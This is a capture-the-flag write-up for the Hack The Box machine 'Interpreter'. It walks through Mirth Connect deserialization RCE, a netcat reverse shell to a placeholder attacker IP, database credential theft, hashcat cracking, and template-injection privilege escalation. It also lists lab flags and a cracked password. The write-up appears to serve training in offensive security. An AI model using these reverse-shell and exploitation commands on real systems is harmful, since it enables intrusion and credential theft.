# 🖥 HTB Writeup: Interpreter

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Rooted-success)

---

## 🎯 Target Information

| Field | Value |
|-------|--------|
| IP | 10.129.3.174 |
| Hostname | interpreter.htb |
| Platform | Linux |


---

# 📑 Table of Contents

1. [Enumeration](#-enumeration)
2. [Exploitation (Mirth RCE)](#-exploitation)
3. [Reverse Shell](#-reverse-shell)
4. [Credential Extraction](#-credential-extraction)
5. [Password Cracking](#-password-cracking)
6. [Privilege Escalation](#-privilege-escalation)
7. [Final Flags](#-final-flags)
8. [Lessons Learned](#-lessons-learned)

---

# 🔎 Enumeration

<details>
<summary>Click to expand Nmap results</summary>

```bash
nmap -sC -sV -Pn 10.129.3.174
```

### Open Ports

- 22 → SSH
- 80 → HTTP
- 443 → HTTPS

</details>

---

# 💥 Exploitation

The target was running **Mirth Connect 4.4.0**, vulnerable to Java deserialization RCE via the API endpoint.

Exploit executed using:

```bash
python3 exploit.py -u https://interpreter.htb -c 'id'
```

Command execution confirmed.

---

# 🐚 Reverse Shell

Listener:

```bash
nc -lvnp 4444
```

Trigger:

```bash
python3 exploit.py -u https://interpreter.htb -c 'nc -c sh <ATTACKER_IP> 4444'
```

Stabilized using:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

User obtained: `mirth`

---

# 🔐 Credential Extraction

Credentials found in:

```
/usr/local/mirthconnect/conf/mirth.properties
```

Connected to local MySQL and extracted user hash for `sedric`.

---

# 🔓 Password Cracking

Converted PBKDF2 hash format and cracked with:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```
snowflake1
```

---

# 🚀 Privilege Escalation

A root-owned Flask service was running locally on:

```
127.0.0.1:54321
```

Abused template injection in XML POST request to read:

```
/root/root.txt
```

Root flag retrieved successfully.

---

# 🏁 Final Flags

| Access | Flag |
|--------|------|
| User   | 3acab28a6dd180eb8338a3811c35d7ff |
| Root   | d59de65d599fe370678a6c54dc59fabc |

---

# 🎓 Lessons Learned

- Java deserialization vulnerabilities remain critical in enterprise apps.
- Internal services bound to localhost are not safe if accessible post-compromise.
- Credential storage mechanisms should avoid weak PBKDF2 implementations.
- Template injection can lead to full root compromise.

---

## 🧠 Final Thoughts

Interpreter demonstrated how chaining multiple moderate vulnerabilities can lead to full system compromise.

Attack Path Summary:

```
Mirth RCE → mirth user → DB creds → sedric SSH → Template injection → root
```

Machine rooted successfully.
